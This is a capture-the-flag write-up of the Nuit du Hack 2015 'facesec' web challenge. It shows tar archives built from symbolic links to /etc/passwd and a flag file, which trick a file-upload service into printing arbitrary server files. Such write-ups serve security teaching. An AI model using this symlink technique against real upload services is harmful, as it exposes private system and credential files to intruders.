---
layout: post
title:  "Nuit du Hack - facesec"
date:   2015-04-08 21:55:00
categories: writeups
tags:
- ndh
- web
excerpt: "Caught mid-thought (wondering whether faceSec's famous breakrooms carry my favorite small-batch, gluten-free, co-op produced snack food) I realized that I had failed to include my letter of motivation or done anything with that tar upload functionality.  D'oh!"
author: anonymous_zombie
---

>"Hello there,
>
>We are looking for a developer or security consultant to secure our filebox system. We stumbled upon your LinkedIn profile and it seems like you would be a perfect candidate for this job. Could you please send us your CV and Motivation letter?
>
>Thanks,
>
>faceSec HR Director."

- Points: 100
- Link: http://facesec.challs.nuitduhack.com/

We first visit the site and find that there isn't much to do without creating an account; we do so using some throw-away credentials.  After authenticating, we're informed that the site anticipates us uploading a CV and letter of motivation in a flat-file format or alternatively can upload both in a Tar file.

![Site greeter]({{ site.url }}/writeups/ndh2015/facesec/greeting.png)

Being the diligent testers we are (and oh so hopeful that we may someday work at the lofty faceSec(c)), we upload a CV that provides the sum-total of all Vegan Zombie members life experiences.  After getting an "upload successful" message, we visit our user profile page to confirm that everything worked as anticipated.

![It's what we do]({{ site.url }}/writeups/ndh2015/facesec/grains.png)

Cool!  Maybe faceSec will be impressed by our knowledge of formsubmission and animal-free diets.  Time to sit back and wait for that recruiters phone call!  Caught mid-thought (wondering whether faceSec's famous breakrooms carry my favorite small-batch, gluten-free, co-op produced snack food) I realized that I had failed to include my letter of motivation or done anything with that tar upload functionality.  D'oh!  Also, I'm lazy, let's use the tar option to upload everything at once!

{% highlight bash %}
$ ln -s /etc/passwd cv.txt
$ ln -s ../flag.txt motiv.txt
$ ls -l
	cv.txt -> /etc/passwd
	motiv.txt -> ../flag.txt
$ tar -cvf upload.tar cv.txt motiv.txt
{% endhighlight %}

Having been created without the "-k" flag, the symbolic links in the tar file should be preserved (as long as the file is also untar'd without this flag).  This will result in the application following the symbolic link when it attempts to open the file to print it out giving us the contents of arbitrary server files.  In this case, we get the contents of /etc/passwd which contain the flag: *W00tSymL1nkAttackStillW0rksIn2k15*.

![Yay flags]({{ site.url }}/writeups/ndh2015/facesec/flag.png)

Yeah, on second thought, I don't think I wanted to work for faceSec(c) anyways.
